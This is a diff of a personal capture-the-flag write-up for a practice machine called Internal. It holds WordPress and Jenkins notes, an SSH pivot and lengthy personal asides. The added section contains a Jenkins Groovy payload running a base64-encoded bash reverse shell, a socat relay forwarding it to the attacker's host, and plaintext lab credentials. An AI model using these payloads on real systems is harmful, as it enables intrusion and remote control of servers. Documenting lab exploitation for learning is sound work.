@@ -9,6 +9,7 @@ Learnt:
 - MORE CLI Cool Commands
 Beyond Root:
 - Unintend SQL injection to retain Writeup status - CVE is 2022 and box is 2020 and its a Offensive Path box from the TheMayor and the last one was evil. I have spent so much time painfully flailing on this machine. I can only justify do this for completionism
+- XCT Windows Privilege Escalation - https://notes.vulndev.io/wiki/redteam/privilege-escalation/windows
 
 - [[Internal-Notes.md]]
 - [[Internal-CMD-by-CMDs.md]]
@@ -101,9 +102,7 @@ https://developer.wordpress.org/reference/classes/wp_meta_query/
 2. Guess the probable SQL query
 3. Force an error 
 
-First stop [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)
-
-Wordpress Version `/license.txt` or `/readme.html`, there is a nuclei template I got jebaited by my brainlessness brain almost into actually be able to contribute to something.
+First stop [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress) Wordpress. Wordpress Version `/license.txt` or `/readme.html`, there is a nuclei template I got jebaited by my brainlessness brain almost into actually be able to contribute to something.
 
 ![](exactWordpressVerson.png)
 
@@ -159,7 +158,6 @@ WHY WOULD YOU MAKE ANOTHER ADMINISTRATIVE USER IN WORDPRESS IT GOES AGAINST THE 
 https://infosecwriteups.com/tryhackme-internal-writeup-480ce471efdd. 
 ![](thankyou.png)
 How is this hard.
-
 
 After I ranted at myself at the State of the West, Cultures, Conflicts of the day, Corporations failing even while being successful. I decided it best to parallel the issues with how I learning and changing. I think this the real systemic problem for world and I. I am reminded of may past cynicism and knowing how things would play out in the world, the futility of knowing the people(s) chose this with all the technology and capability and inventive to do so. And yet here I am humiliating myself to reach a more meta point about the direction of me just trying to make a better life for myself than care about the world. Its not problem of new or old strategy its just a character-of-how-we-get-there problem. We need unified truth on the best path, its costs and its rewards. 
 - If I monopolise my time without growing and cultivating novelty, I am not adapting like nature does
@@ -249,14 +247,98 @@ Re-leafing the tree of trump with a health dose of relief
 Atleast it is not a GTFObin
 ![](noaubreannainthewpdatabase.png)
 
-
 The temptation to pwnkit this machine is quite real. And I try and ruined the potentially without another painful restart. Do not worry another fly WTF moment again.
 ![](optdirectory.png)
 
 Thought nginx was runner on localhost 8080, but it is Jenkins
 ![](jenkins.png)
 
-But Jenkins is being run by aubreanna
+But Jenkins is being run by aubreanna,  but there maybe some credentials seem to be the pattern of this box... I need practice with chisel and socat for shell relaying so instead the more OPSEC ssh Dynamic port forward.
+
+For the SSH Local Dynamic Proxy - we initiate the command from kali to tell the client bind localhost 9000 to the connection made to the SSH server of Internal.thm.
+![](sshremotereversedynamicproxy.png)
+We then configure proxy chains to socks4 at the localhost 9000.
+```
+ssh -N -D 127.0.0.1:9000 aubreanna@10.10.52.103
+```
+
+After deliberation over the next 2 weeks scheduled to fix my cheatsheets on Chisel, SSH tunneling and Socat and other alternatives. I am planning doing Dante in June so that needs to correct.
+
+https://en.wikipedia.org/wiki/Jenkins_(software)
+
+![](opsecwayiseasierwaythiswayforwebroot.png)
+```
+admin : admin
+jenkins : jenkins
+
+```
+
+While I ran through proxychains nulcei and nmap, linpeas as aubreanna
+
+Both docker and containerd are on the box in /opt and normal docker installation, both are root controlled, no debug or listing, etc for containers so I need to get into container so be root on the container to mount back as root on internal host box.
+![](noprivcontainers.png)
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation
+She is part of the plugdev and adm and dip group
+- dial up 
+- mount with nodev and nosuid umount removable device (maybe containers) through `pmount`
+- read many log files in /var/log, and can use xconsole
+
+```
+admin : 
+jenkins :
+aubreanna : bubb13guM!@#123
+
+admin : my2boys
+william : arnold147
+
+```
+
+HackTricks Brazil hosts Jenkins pages for some reason
+
+![](msfauxmodule.png)
+
+
+![](noexecution.png)
+
+![](nojenkinsexploitfromsearchsploit.png)
+
+https://github.com/gquere/pwn_jenkins
+
+No jenkins_home or share directory?
+![](wtfisthevardirectorywhenshareinsidenoexistbutaprocesswhat.png)
+
+[SPONGE BOBBLE](https://www.youtube.com/watch?v=5JTZbGOG91Y) - Love the way the Voice Actor says this.
+![](SPONGEBOBBLE.png)
+
+Proxy the reverse shell back through `socat` on the Internal host
+![](nowtogrooveyreverseshell.png)
+
+https://hacktricks.boitatech.com.br/pentesting/pentesting-web/jenkins
+```java
+// bash -c 'bash -i >& /dev/tcp/172.17.0.1/10000 0>&1'
+
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzEwMDAwIDA+JjEn}|{base64,-d}|{bash,-i}'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(10000000000000)
+println "out> $sout err> $serr"
+```
+[waitForOrKill - Groovey Documentation](https://docs.groovy-lang.org/2.4.0/html/api/org/codehaus/groovy/runtime/ProcessGroovyMethods.html#waitForOrKill(java.lang.Process,%20long)) *"Wait for the process to finish during a certain amount of time, otherwise stops the process....the number of milliseconds to wait before stopping the process!!"*
+
+Socat Relay back to our box for style points, rather than use `nc` in ssh session
+```
+nohup socat TCP-LISTEN:10000,reuseaddr,fork,range=172.17.0.1/24 TCP:10.11.3.193:8443 &
+```
+
+
+![](wearejenkins.png)
+
+![](rootpasswordinthenotes.png)
+
+...
+![](wtfwasthisbox.png)
+Ok....
+
 ## Post-Root-Reflection  
 
 My *"House"* motto - In time.. there is truth
@@ -272,17 +354,9 @@ Funny GOT hacking related house mottos
 
 Deduction, ... 
 
-Unintended SQLi above to reatin Writeup status of this box.
+#### Unintended Web access path
 
-Try to turtle a terrapin
-https://en.wikipedia.org/wiki/Terrapin_attack
-https://jfrog.com/blog/ssh-protocol-flaw-terrapin-attack-cve-2023-48795-all-you-need-to-know/
-https://github.com/RUB-NDS/Terrapin-Artifacts
-
-
-#### Unintended retain Writeup Status path
-
-I would really like to do one of the SQL injections myself and Rule of Acquisation number 17 is a contract is a contract is a contract - but between ferengi. And hacker without flags is no hacker at all. Quality of the flags and should be subject to the same scrutiny written above, terms and your attention is mine on the condition that I even succeed. Lmao.
+Unintended SQLi is possible and I want do to retain Writeup status of this box I would really like to do one of the SQL injections myself and Rule of Acquisation number 17 is a contract is a contract is a contract - but ionly between ferengi. And hacker without flags is no hacker at all. Quality of the flags and should be subject to the same scrutiny written above, terms and your attention is mine on the condition that I even succeed. Lmao. Added The Rules of Hackquisition as a Beyond Root Todo.
 
 ```bash
 # Does require another sed command to remove the ` ^[[31m^[[0m ` unless you copy from post-stdout  
